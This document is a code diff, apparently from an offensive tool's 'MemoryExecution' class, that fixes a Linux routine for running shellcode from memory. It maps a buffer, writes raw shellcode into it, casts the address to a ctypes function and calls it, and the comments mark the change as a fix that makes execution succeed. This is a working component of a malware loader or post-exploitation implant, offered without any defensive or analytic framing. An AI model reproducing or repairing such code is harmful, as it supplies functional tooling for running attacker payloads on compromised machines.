@@ -114,6 +114,7 @@ class MemoryExecution:
         try:
             import mmap
 
+            # FIX: Use proper ctypes approach for Linux shellcode execution
             # Allocate executable memory
             mm = mmap.mmap(
                 -1,
@@ -124,11 +125,14 @@ class MemoryExecution:
 
             # Write shellcode
             mm.write(shellcode)
+            mm.seek(0)
 
-            # Execute
-            ctypes_buffer = ctypes.c_int.from_buffer(mm)
-            function = ctypes.CFUNCTYPE(ctypes.c_int64)(ctypes.addressof(ctypes_buffer))
-            function()
+            # FIX: Create ctypes buffer from mmap using ctypes.cast
+            # from_buffer doesn't work with mmap objects directly
+            addr = ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
+            func_type = ctypes.CFUNCTYPE(ctypes.c_void_p)
+            func = func_type(addr.value)
+            func()
 
             logger.success("Shellcode executed successfully")
             return True
